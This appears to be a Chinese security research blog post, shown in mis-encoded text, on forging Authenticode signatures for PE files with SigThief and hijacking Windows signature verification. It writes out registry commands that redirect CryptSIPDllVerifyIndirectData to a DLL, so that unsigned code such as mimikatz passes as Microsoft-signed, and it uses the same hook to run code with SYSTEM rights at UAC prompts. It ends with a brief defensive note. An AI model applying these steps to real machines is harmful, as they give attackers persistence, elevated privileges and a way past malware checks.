I"Ñ@<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7">ã€ŠCATæ–‡ä»¶æ•°å­—ç­¾åä½¿ç”¨æŠ€å·§ã€‹</a>ä»‹ç»äº†è¯ä¹¦ç­¾åçš„åŸºç¡€çŸ¥è¯†ï¼ŒWindowsç³»ç»Ÿä¸‹å‘æ–‡ä»¶ç­¾åæœ‰ä¸¤ç§æ–¹æ³•ï¼šæ·»åŠ åœ¨æ–‡ä»¶æœ«å°¾(Authenticode)å’ŒCATæ–‡ä»¶(catalog)ï¼Œæœ¬æ–‡å°†ä»‹ç»Authenticodeç­¾åçš„ç›¸å…³åˆ©ç”¨æŠ€å·§â€”â€”PEæ–‡ä»¶çš„ç­¾åä¼ªé€ ä¸ç­¾åéªŒè¯åŠ«æŒ</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æœ¬æ–‡ä»‹ç»çš„æŠ€å·§å‚è€ƒè‡ªMatt Graeber@mattifestationå…¬å¼€çš„èµ„æ–™ï¼Œæœ¬æ–‡å°†ç»“åˆè‡ªå·±çš„ç»éªŒï¼Œæ•´ç†ç›¸å…³å†…å®¹ï¼Œæ·»åŠ ä¸ªäººç†è§£ã€‚</p>

<p><strong>å‚è€ƒèµ„æ–™ï¼š</strong></p>

<p>https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf</p>

<p>http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html</p>

<p>https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
  <li>PEæ–‡ä»¶çš„Authenticodeç­¾åä¼ªé€ </li>
  <li>åŠ«æŒç­¾åéªŒè¯è¿‡ç¨‹ï¼Œå®ç°ä»£ç æ‰§è¡Œï¼Œä½œä¸ºåé—¨</li>
</ul>

<h2 id="0x02-peæ–‡ä»¶çš„ç­¾åä¼ªé€ ">0x02 PEæ–‡ä»¶çš„ç­¾åä¼ªé€ </h2>
<hr />

<p>Authenticodeçš„è¯¦ç»†è¯´æ˜æ–‡æ¡£å¯å‚è€ƒï¼š</p>

<p>http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx</p>

<p>éƒ¨åˆ†ç³»ç»Ÿæ–‡ä»¶ä¼šåŒ…å«å¾®è½¯çš„ç­¾åï¼Œä¾‹å¦‚<code class="language-plaintext highlighter-rouge">C:\Windows\System32\consent.exe</code></p>

<p>é€šè¿‡æ–‡ä»¶å±æ€§èƒ½å¤Ÿçœ‹åˆ°ç›¸å…³ç­¾åä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-1.png" alt="Alt text" /></p>

<p>é€šè¿‡powershelléªŒè¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature C:\Windows\System32\consent.exe
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-2.png" alt="Alt text" /></p>

<p>å€ŸåŠ©å·¥å…·CFF Explorerè·å–æ–‡ä»¶ç»“æ„ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-3.png" alt="Alt text" /></p>

<p>Security Directory RVAä»£ç æ•°å­—ç­¾ååœ¨PEæ–‡ä»¶ä¸­çš„åç§»ä½ç½®
Security DirectorySizeä»£è¡¨æ•°å­—ç­¾åçš„é•¿åº¦</p>

<p>å°†è¿™éƒ¨åˆ†å†…å®¹æå–ï¼Œå¤åˆ¶åˆ°å¦ä¸€ä¸ªæ–‡ä»¶test.exeçš„å°¾éƒ¨ï¼ŒåŒæ—¶ä½¿ç”¨<code class="language-plaintext highlighter-rouge">CFF Explorer</code>ä¿®æ”¹test.exeå¯¹åº”çš„<code class="language-plaintext highlighter-rouge">Security Directory RVA</code>å’Œ<code class="language-plaintext highlighter-rouge">Security DirectorySize</code></p>

<p>è¿™æ ·ï¼Œå°±å®ç°äº†æ•°å­—ç­¾åçš„ä¼ªé€ </p>

<p>å¼€æºå·¥å…·SigThiefå¯è‡ªåŠ¨å®ç°ä»¥ä¸Šè¿‡ç¨‹ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/secretsquirrel/SigThief</p>

<h3 id="å®é™…æµ‹è¯•">å®é™…æµ‹è¯•ï¼š</h3>

<p>æµ‹è¯•ç³»ç»Ÿï¼š Win7</p>

<p>å°†<code class="language-plaintext highlighter-rouge">C:\Windows\System32\consent.exe</code>çš„æ•°å­—ç­¾åå¤åˆ¶åˆ°mimikatz.exeä¸­</p>

<p>å‚æ•°å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i C:\Windows\System32\consent.exe -t mimikatz.exe -o si.exe 
</code></pre></div></div>

<p>ç”Ÿæˆsi.exeï¼Œå…·æœ‰å¾®è½¯æ•°å­—ç­¾åï¼Œä½†æç¤ºè¯ä¹¦æ— æ•ˆï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-4.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>éƒ¨åˆ†æµ‹è¯•ç³»ç»Ÿæ— æ³•ä½¿ç”¨sigthief.pyï¼Œæç¤ºæ‰¾ä¸åˆ°0x9ï¼Œå°†ç³»ç»Ÿæ¿€æ´»å³å¯</p>

<p>é€šè¿‡powershelléªŒè¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\si.exe
</code></pre></div></div>

<p>æ˜¾ç¤ºHashMismatchï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-5.png" alt="Alt text" /></p>

<p>é€šè¿‡signtool.exeéªŒè¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /v si.exe
</code></pre></div></div>

<p>æ˜¾ç¤º<code class="language-plaintext highlighter-rouge">SignTool Error: WinVerifyTrust returned error: 0x80096010</code>ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-6.png" alt="Alt text" /></p>

<p>é€šè¿‡sigcheck.exeéªŒè¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q si.exe
</code></pre></div></div>

<p>æ˜¾ç¤º<code class="language-plaintext highlighter-rouge">The digital signature of the object did not verify</code>ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-7.png" alt="Alt text" /></p>

<h2 id="0x03-ä¿®æ”¹é…ç½®ä½¿ç­¾åé€šè¿‡éªŒè¯">0x03 ä¿®æ”¹é…ç½®ï¼Œä½¿ç­¾åé€šè¿‡éªŒè¯</h2>
<hr />

<p>æŸ¥çœ‹<code class="language-plaintext highlighter-rouge">Get-AuthenticodeSignature</code>çš„å¸®åŠ©è¯´æ˜ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Help Get-AuthenticodeSignature -Full 
</code></pre></div></div>

<p>æŸ¥çœ‹ç›¸å…³æ“ä½œ<code class="language-plaintext highlighter-rouge">Set-AuthenticodeSignature</code>çš„å¸®åŠ©è¯´æ˜ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Help Set-AuthenticodeSignature -Full
</code></pre></div></div>

<p>å‘ç°è¯¥å‘½ä»¤çš„åŠŸèƒ½ï¼š</p>

<blockquote>
  <p>The Set-AuthenticodeSignature cmdlet adds an Authenticode signature to
any file that supports Subject Interface Package (SIP).</p>
</blockquote>

<p>å…³äºSIPçš„èµ„æ–™ï¼Œå¯å‚è€ƒï¼š</p>

<p>https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/</p>

<p>è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼š</p>

<blockquote>
  <p>There are some included as part of the OS (at least on Vista). Locate
in the %WINDIR%\System32 directory. They usually have a naming ending
with sip.dll, i.e. msisip.dll is the Microsoft Installer (.msi) SIP.</p>
</blockquote>

<p>å¯»æ‰¾Windowsä¸‹çš„SIP:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls C:\Windows\System32\*sip.dll -Recurse -ErrorAction SilentlyContinue
</code></pre></div></div>

<p>Win7ä¸‹åªæœ‰ä¸€ä¸ªï¼š<code class="language-plaintext highlighter-rouge">C:\Windows\System32\msisip.dll</code></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>Matt Graeberçš„æµ‹è¯•ç³»ç»Ÿä¸ºWin10ï¼Œå¯ä»¥æ‰¾åˆ°å¤šä¸ªdll</p>

<p>ä½¿ç”¨IDAæ‰“å¼€è¯¥dllï¼ŒæŸ¥çœ‹å‡½æ•°<code class="language-plaintext highlighter-rouge">DllRegisterServer()</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-1.png" alt="Alt text" /></p>

<p>æ‰¾åˆ°ä¸€ä¸ªç‰¹åˆ«çš„åç§°MsiSIPVerifyIndirectDataï¼Œå­—é¢æ„æ€åƒæ˜¯ç­¾åéªŒè¯åŠŸèƒ½</p>

<p>æŸ¥æ‰¾èµ„æ–™ï¼Œæ‰¾åˆ°è¯¥å‡½æ•°ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/cc542591%28v=vs.85%29.aspx</p>

<p>å‘ç°è¯¥å‡½æ•°ï¼Œè¿”å›TRUEä»£è¡¨éªŒè¯æˆåŠŸï¼Œè¿”å›FALSEä»£è¡¨éªŒè¯å¤±è´¥</p>

<p>è¯¥åŠŸèƒ½å¯¹åº”æ³¨å†Œè¡¨é”®å€¼ï¼Œä½ç½®å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-2.png" alt="Alt text" /></p>

<p>ä¸åŒGUIDå¯¹åº”ä¸åŒæ–‡ä»¶æ ¼å¼çš„éªŒè¯ï¼Œä¾‹å¦‚ï¼š</p>

<ul>
  <li>C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE</li>
  <li>DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.catæ–‡ä»¶</li>
  <li>9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL 		.ctlæ–‡ä»¶</li>
  <li>C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet 	.cabæ–‡ä»¶</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>GUIDè¯´æ˜å¼•ç”¨è‡ª<a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf">ã€ŠSubverting Trust in Windowsã€‹</a> Page4</p>

<p>æ¥ä¸‹æ¥ï¼Œå°è¯•æ›¿æ¢<code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}</code>ä¸‹çš„dllå’ŒFuncName</p>

<p>é€šè¿‡c++å®ç°ï¼Œåˆ›å»ºdllï¼Œæ·»åŠ å¯¼å‡ºå‡½æ•°ï¼Œæ ¼å¼å‚ç…§<code class="language-plaintext highlighter-rouge">CryptSIPVerifyIndirectData</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL WINAPI CryptSIPVerifyIndirectData(SIP_SUBJECTINFO *pSubjectInfo, SIP_INDIRECT_DATA *pIndirectData)
{
	return TRUE;
}
</code></pre></div></div>

<p>ç¼–è¯‘ç”Ÿæˆsigntest.dll</p>

<p>ä¿®æ”¹æ³¨å†Œè¡¨ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "CryptSIPVerifyIndirectData" /f
</code></pre></div></div>

<p>é‡æ–°å¯åŠ¨cmdï¼Œä½¿ç”¨powershellè¿›è¡ŒéªŒè¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\si.exe
</code></pre></div></div>

<p>æ˜¾ç¤ºValidï¼Œæ ¡éªŒæˆåŠŸ</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-3.png" alt="Alt text" /></p>

<p>é€šè¿‡signtool.exeéªŒè¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /v si.exe
</code></pre></div></div>

<p>éªŒè¯é€šè¿‡</p>

<p>é€šè¿‡sigcheck.exeéªŒè¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q si.exe
</code></pre></div></div>

<p>éªŒè¯é€šè¿‡ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-4.png" alt="Alt text" /></p>

<p>é‡å¯explorer.exeï¼ŒæŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼Œç­¾åçŠ¶æ€ï¼Œæ˜¾ç¤ºç­¾åç”Ÿæ•ˆï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-5.png" alt="Alt text" /></p>

<p>æ›´è¿›ä¸€æ­¥ï¼Œ<strong>dllä¸€å®šè¦å›ºå®šæ ¼å¼å—ï¼Ÿ</strong></p>

<p>äºæ˜¯è¿›è¡Œæ¥ä¸‹æ¥çš„æµ‹è¯•ï¼š</p>

<p>å¯¼å‡ºå‡½æ•°åä¸ºtest1ï¼Œå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}
BOOL WINAPI test1() 
{
	return TRUE;
}
</code></pre></div></div>

<p>ä¿®æ”¹å¯¹åº”æ³¨å†Œè¡¨é”®å€¼ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "test1" /f
</code></pre></div></div>

<p>æµ‹è¯•ä»èƒ½å¤Ÿç»•è¿‡éªŒè¯</p>

<p>è¿™å°±è¯´æ˜ï¼Œåªè¦dllçš„å¯¼å‡ºå‡½æ•°è¿”å›TRUEï¼Œå°±èƒ½å¤Ÿç»•è¿‡éªŒè¯</p>

<p>æ‰€ä»¥ï¼Œå¯ä»¥æŸ¥æ‰¾ç³»ç»Ÿé»˜è®¤çš„dllï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯¼å‡ºå‡½æ•°è¿”å›trueå³å¯ï¼ˆå½“ç„¶ï¼Œæ­¤å¤„å¯ä¾›åˆ©ç”¨çš„å¯¼å‡ºå‡½æ•°æœ‰å¾ˆå¤šï¼‰</p>

<p>ä¾‹å¦‚<code class="language-plaintext highlighter-rouge">"C:\Windows\System32\ntdll.dll" </code></p>

<p>å¯¼å‡ºå‡½æ•°ï¼š<code class="language-plaintext highlighter-rouge">DbgUiContinue</code></p>

<p>ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
</code></pre></div></div>

<p>è¿™æ ·ï¼Œå°±ä¸éœ€è¦åœ¨ç³»ç»Ÿä¸Šç•™ä¸‹è‡ªå·±ç¼–å†™çš„dll</p>

<p>å¯¹äº64ä½ç³»ç»Ÿï¼Œå­˜åœ¨32ä½çš„æ³¨å†Œè¡¨é”®å€¼</p>

<p>å¦‚æœä½¿ç”¨32ä½çš„ç¨‹åºï¼Œå¦‚32ä½çš„signtoolå’Œsigcheckï¼Œä¸ºäº†ç»•è¿‡éªŒè¯ï¼Œè¿˜éœ€è¦ä¿®æ”¹32ä½çš„æ³¨å†Œè¡¨é”®å€¼ï¼Œå¯¹åº”ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f

REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
</code></pre></div></div>

<h2 id="0x04-ç­¾åéªŒè¯åŠ«æŒ">0x04 ç­¾åéªŒè¯åŠ«æŒ</h2>
<hr />

<p>ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œç¼–å†™dllå®ç°å¯¹ç­¾åéªŒè¯è¿‡ç¨‹çš„ç»•è¿‡ï¼Œå¦‚æœæˆ‘ä»¬åœ¨dllçš„å¯¼å‡ºå‡½æ•°é‡Œé¢åŠ å…¥è‡ªå·±çš„ä»£ç ï¼Œè¿™å°±å®ç°äº†ç­¾åéªŒè¯åŠ«æŒ</p>

<p>åœ¨ç­¾åéªŒè¯ä¸­åŠ å…¥æ‰§è¡Œä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}
BOOL WINAPI test1() 
{
	WinExec("calc.exe",SW_SHOWNORMAL);
	return TRUE;
}
</code></pre></div></div>

<p>åªè¦æ¶‰åŠç­¾åéªŒè¯çš„æ“ä½œï¼ŒåŠ è½½æˆ‘ä»¬è‡ªå·±çš„dllï¼Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨</p>

<p>ä»¥ä¸‹ç¨‹åºä¼šä½¿ç”¨ç­¾åéªŒè¯æ“ä½œï¼š</p>

<ul>
  <li>DllHost.exe - When the â€œDigital Signaturesâ€ tab is displayed in file properties</li>
  <li>Process Explorer - When the â€œVerified Signerâ€ tab is displayed</li>
  <li>Autoruns</li>
  <li>Sigcheck</li>
  <li>consent.exe - Any time a UAC prompt is displayed</li>
  <li>signtool.exe</li>
  <li>smartscreen.exe</li>
  <li>Get-AuthenticodeSignature</li>
  <li>Set-AuthenticodeSignature</li>
  <li>Security vendor software that performs certificate validation based on calls to WinVerifyTrust.</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯¥å¤„å¼•ç”¨è‡ª<a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf">ã€ŠSubverting Trust in Windowsã€‹</a> Page33</p>

<p>ä¾‹å¦‚ï¼ŒæŸ¥çœ‹æ–‡ä»¶å±æ€§-æ•°å­—ç­¾åè¯¦ç»†ä¿¡æ¯ï¼ŒåŠ è½½dllï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-1.png" alt="Alt text" /></p>

<p>ç‰¹åˆ«çš„ï¼Œä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œç¨‹åºä¼šå¼¹å‡ºUACï¼Œå¦‚æœå¯¹æ­¤è¿›è¡ŒåŠ«æŒï¼Œæ­¤æ—¶çš„æƒé™ä¸ºsystem</p>

<p>å®Œæ•´æ“ä½œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-2.gif" alt="Alt text" /></p>

<h3 id="è¡¥å……">è¡¥å……ï¼š</h3>

<p><strong>1ã€dllåŠ«æŒ</strong></p>

<p>æœ‰äº›GUIDï¼Œé»˜è®¤æ³¨å†Œè¡¨çš„dllè·¯å¾„ä¸ºç›¸å¯¹è·¯å¾„ï¼Œè¿™é‡Œå°±å­˜åœ¨dllåŠ«æŒçš„é—®é¢˜ï¼Œä¸éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ä¹Ÿèƒ½å®ç°ç»•è¿‡ç­¾åéªŒè¯</p>

<p><strong>2ã€Hiding from Autoruns</strong></p>

<p>å¯åŠ¨é¡¹æ£€æµ‹å·¥å…·Autorunsé»˜è®¤ä¸æ˜¾ç¤ºå¸¦æœ‰å¾®è½¯ç­¾åçš„æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/5-1.png" alt="Alt text" /></p>

<p>å¦‚æœæ–‡ä»¶åŒ…å«å¾®è½¯ç­¾åï¼Œé»˜è®¤ä¸ä¼šæ˜¾ç¤ºåœ¨Autorunsé¢æ¿</p>

<h2 id="0x05-é˜²å¾¡å»ºè®®">0x05 é˜²å¾¡å»ºè®®</h2>
<hr />

<p>éƒ¨åˆ†ç™½åå•ç¨‹åºé»˜è®¤ä¼šä¿¡ä»»å¸¦æœ‰å¾®è½¯è¯ä¹¦çš„æ–‡ä»¶ï¼Œè¿™é‡Œå°±å­˜åœ¨éšæ‚£</p>

<p>å»ºè®®ä¸è¦ç›²ç›®ç›¸ä¿¡è¯ä¹¦</p>

<h2 id="0x06-å°ç»“">0x06 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†Authenticodeç­¾åçš„ç›¸å…³åˆ©ç”¨æŠ€å·§â€”â€”PEæ–‡ä»¶çš„ç­¾åä¼ªé€ ä¸ç­¾åéªŒè¯åŠ«æŒï¼Œä¸‹ä¸€ç¯‡æ–‡ç« å°†ç»§ç»­ä»‹ç»Authenticodeç­¾åçš„ä¼ªé€ æŠ€å·§â€”â€”é’ˆå¯¹æ–‡ä»¶ç±»å‹çš„ç­¾åä¼ªé€ ã€‚</p>

<p>æœ€åæ„Ÿè°¢Matt Graeberçš„åˆ†äº«ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET